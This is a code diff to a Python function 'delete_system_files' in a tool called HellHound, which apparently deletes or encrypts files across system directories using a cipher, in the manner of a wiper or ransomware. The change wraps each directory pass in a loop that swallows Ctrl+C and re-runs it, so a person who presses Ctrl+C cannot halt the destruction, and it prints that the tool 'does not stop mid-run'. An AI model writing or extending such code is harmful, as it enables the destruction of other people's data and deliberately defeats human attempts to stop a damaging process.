@@ -442,13 +442,31 @@ def delete_system_files(encrypt_mode=False):
     
     for target_path in target_paths:
         print(f"\n\033[95m>>> Processing: {target_path}\033[0m")
-        files_deleted, dirs_deleted = delete_directory_contents_threaded(
-            target_path, 
-            cipher, 
-            encrypt_mode, 
-            MAX_FILES_LIMIT
-        )
-        
+        # The per-tree worker disregards Ctrl+C inside its scan /
+        # processing / cleanup phases, but a Ctrl+C landing OUTSIDE
+        # those phases (at this call, or on the prints between trees)
+        # escaped delete_system_files entirely and reached main()'s
+        # interrupt handler — the run stopped mid-scope despite the
+        # in-run announcements promising completion. Retry the tree:
+        # re-processing is idempotent (missing files are skipped,
+        # rmdir only succeeds on dirs still present), so the announced
+        # scope still completes in full.
+        while True:
+            try:
+                files_deleted, dirs_deleted = delete_directory_contents_threaded(
+                    target_path,
+                    cipher,
+                    encrypt_mode,
+                    MAX_FILES_LIMIT
+                )
+                break
+            except KeyboardInterrupt:
+                print("\033[91m[!] Ctrl+C pressed between trees — "
+                      "HellHound does not stop mid-run; this tree will "
+                      "be re-processed and the run will complete the "
+                      "scope announced above.\033[0m")
+                continue
+
         stats["total_dirs_deleted"] += dirs_deleted
         print(f"\033[92m[✓] Directory complete: {files_deleted} files deleted, {dirs_deleted} directories removed\033[0m")
     
